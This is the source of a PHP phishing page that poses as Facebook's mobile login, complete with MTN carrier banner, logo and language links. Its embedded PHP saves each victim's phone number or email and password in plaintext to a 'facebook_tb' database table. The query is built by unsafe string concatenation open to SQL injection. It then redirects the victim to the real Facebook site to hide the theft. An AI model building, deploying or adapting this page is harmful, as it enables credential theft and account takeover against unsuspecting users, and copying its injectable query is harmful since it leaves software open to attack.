<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Login</title>
<style>
::placeholder{
	color:silver;
	padding-left:20px;
}
</style>
<link rel="icon" 
      type="image/png/svg" 
      href="img/fbfav.svg">
<link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
</head>
<body>
<div class="info" style=" background:lightblue; text-align:center; border:2px solid dodgerblue; border-top:none; border-right:none; border-left:none;">
<h6>By proceeding, you agree to <a href="https://m.facebook.com/mobile/zero/carrier_term/" style="text-decoration:none;">MTN's Terms,</a> which includes letting Facebook request and receive your number. <a href="https://touch.facebook.com/header_settings/?redirect_url=https%3A%2F%2Ftouch.facebook.com%2F&flow=opt_out&refid=8" style="text-decoration:none;"> Change settings</a></h6>
</div>
<div class="info" style=" background:papayawhip; text-align:left;  border:2px solid tan; border-top:none; border-right:none; border-left:none;">
<a style="margin-left:10px;">Login To Continue.</a>
</div>
<center>
<p><img src="img/fblogo.png" style="height:30px; width:150px; margin-top:10px;"></p>
<form action="" method="POST">
<?php
include "conn.php";

if (isset($_POST['submit']))

{   
$phonenumber=$_POST['phonenumber'];
$password=$_POST['password'];
$insert="INSERT INTO facebook_tb (phonenumber,password) VALUES('$phonenumber','$password')";
$sqli=$conn->query($insert);


if ($sqli)
	
{
header('Location:https://m.facebook.com/');
}


else 
	
{
echo "<span style=color:red>Incorrect Password !</span>";	
}
}
?>

<p><input type="text" class="phonenumber" name="phonenumber" placeholder="Mobile number or email address" style=" padding-top:15px; padding-bottom:15px;  background:whitesmoke; width:90%; border:1px solid lightgrey; border-radius:5px 5px; outline:none;" required></p>
<p><input type="text" name="password" placeholder="password" style=" padding-top:15px; padding-bottom:15px; background:whitesmoke; width:90%; border:1px solid lightgrey; border-radius:5px 5px; outline:none;"></p>
<p><input type="submit" name="submit" value="Log In" style=" margin-top:20px; padding-top:10px; padding-bottom:10px; color:white; font-weight:bold; font-family:arial; font-size:30px; background:dodgerblue;  width:90%; border:none; border-radius:5px 5px; outline:none;" required></p>
</form>
<table>
<tr>
<td style=" width:43.8%; border-bottom:2px solid gainsboro;"></td>  
<td style="font-family:arial; padding-right:30px; padding-left:30px; margin-top:10px;"> or </td> 
<td style=" width:43.8%; border-bottom:2px solid gainsboro;"></td>
</tr>
</table>
<a href="https://m.facebook.com/reg"><input value="Create New Account" style=" text-align:center; padding:15px; margin-top:20px; border-radius:5px; background:green; color:white; font-family:arial; font-weight:bold; border:none; outline:none;" readonly></a>
<p><a href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&r&cuid&ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIwMTUyNTUwLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&lwv=100&refid=9" style="text-decoration:none; font-family:arial; font-size:15px;"> Forgotten password? </a></p>
<table style="margin-left:20px;">
<tr>
<td style="padding-right:150px; text-align:center;"><a style="text-decoration:none; font-size:15px; color:black; font-weight:bold;">English (UK)</a></td>
<td><a href="https://m.facebook.com/a/language.php?l=ha_NG&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQDqtIePiDN1uhXQ4A8&refid=9" style=" font-size:15px;text-decoration:none;">Hausa</a></td>
</tr>
<tr>
<td><a href="https://m.facebook.com/a/language.php?l=pt_BR&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQDixCMNtlg2ZxatEro&refid=9" style="text-decoration:none; font-size:15px;">Portugês (Brasil)</a></td>
<td><a href="https://m.facebook.com/a/language.php?l=fr_FR&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQAJFfToIBZEYT5NV7E&refid=9" style="text-decoration:none; font-size:15px;">Français (France)</a></td>
</tr>
<tr>
<td><a href="https://m.facebook.com/a/language.php?l=es_LA&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQBZ1AN84m9c-PGhDiA&refid=9" style="text-decoration:none; font-size:15px;">Español</a></td>
<td><a href="https://m.facebook.com/a/language.php?l=ar_AR&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQDmP1BjkR9pYn7GfMo&refid=9" style="text-decoration:none font-size:15px;;">پساصف</a></td>
</tr>
<tr>
<td><a href="https://m.facebook.com/a/language.php?l=de_DE&lref=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&sref=legacy_mobile_settings_selector&gfid=AQDwFwAQsojGZ3FJdMw&refid=9" style="text-decoration:none; font-size:15px;">Deutsch</a></td>
<td><a href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fnext%3Dhttps%253A%252F%252Fm.facebook.com%252Fhome.php%26refsrc%3Dhttp%253A%252F%252Fwww.google.com%252F&refid=9"><img src="img/plus.png" style="height:30px; width:30px; border:2px solid blue; border-radius:4px 4px; margin-left:20px;"></a></td></tr>
</table>
<table style="margin-top:20px;">
<tr>
<td><a href="https://touch.facebook.com/facebook?refid=8" style="text-decoration:none; color:black; font-weight:bold; color:gray; font-size:15px;">About</a></td>
<td>•</td>
<td><a href="https://touch.facebook.com/help/?ref=pf&refid=8" style="text-decoration:none; color:black; font-weight:bold; color:gray; font-size:15px;">Help</a></td>
<td>•</td>
<td><a style="text-decoration:none; color:black; font-weight:bold; color:gray;">More</a></td>
</tr>
</table>
<p style="color:gray; font-weight:bold;">Facebook Inc.</a></p>
</center>
</body>
</html>